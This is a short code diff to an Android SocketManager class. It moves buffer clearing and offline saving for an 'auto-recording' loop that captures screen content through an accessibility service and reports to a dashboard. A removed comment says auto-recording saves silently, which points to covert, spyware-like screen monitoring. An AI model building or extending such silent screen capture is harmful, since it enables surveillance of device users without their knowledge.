@@ -1501,17 +1501,7 @@ public class SocketManager {
         lastFrameFingerprint = null;
         consecutiveDuplicateCount = 0;
 
-        // Track auto-recording state and clear any stale offline buffer
-        if (sendAutoEvent) {
-            autoRecordingActive = true;
-            autoRecordingStartTime = System.currentTimeMillis();
-            synchronized (offlineFrameBuffer) { offlineFrameBuffer.clear(); }
-        }
-
         final String devId = DeviceInfo.getDeviceId(context);
-
-        // Only notify dashboard for manual recording, not auto-recording (device events)
-        // Auto-recording saves to local storage silently
 
         screenReaderFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
             boolean acq = false;
@@ -1565,7 +1555,7 @@ public class SocketManager {
                 buffered = new java.util.ArrayList<>(offlineFrameBuffer);
                 offlineFrameBuffer.clear();
             }
-            if (!buffered.isEmpty()) {
+            if (buffered != null && !buffered.isEmpty()) {
                 final java.util.ArrayList<JSONObject> toSave = buffered;
                 final long startT = System.currentTimeMillis();
                 executor.execute(() -> saveOfflineRecording(toSave, startT));
@@ -1591,11 +1581,16 @@ public class SocketManager {
      * Guards against restarting an already-running recording loop.
      */
     public void startScreenReaderAuto() {
-        // Guard: don't restart if the loop is already running
         ScheduledFuture<?> current = screenReaderFuture;
         if (current != null && !current.isDone() && !current.isCancelled()) return;
         UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
         if (svc == null) return;
+        
+        // Always clear buffer for fresh recording
+        synchronized (offlineFrameBuffer) { offlineFrameBuffer.clear(); }
+        autoRecordingActive = true;
+        autoRecordingStartTime = System.currentTimeMillis();
+        
         startScreenReaderLoop(svc, true);
     }
 
@@ -1605,6 +1600,18 @@ public class SocketManager {
      * save whatever it has collected.
      */
     public void stopScreenReaderAuto() {
+        // Save immediately before stopping the loop
+        java.util.ArrayList<JSONObject> buffered;
+        synchronized (offlineFrameBuffer) {
+            buffered = new java.util.ArrayList<>(offlineFrameBuffer);
+            offlineFrameBuffer.clear();
+        }
+        
+        if (buffered != null && !buffered.isEmpty()) {
+            final long startT = autoRecordingStartTime > 0 ? autoRecordingStartTime : System.currentTimeMillis();
+            saveOfflineRecording(buffered, startT);
+        }
+        
         stopScreenReaderLoop(true);
     }
 
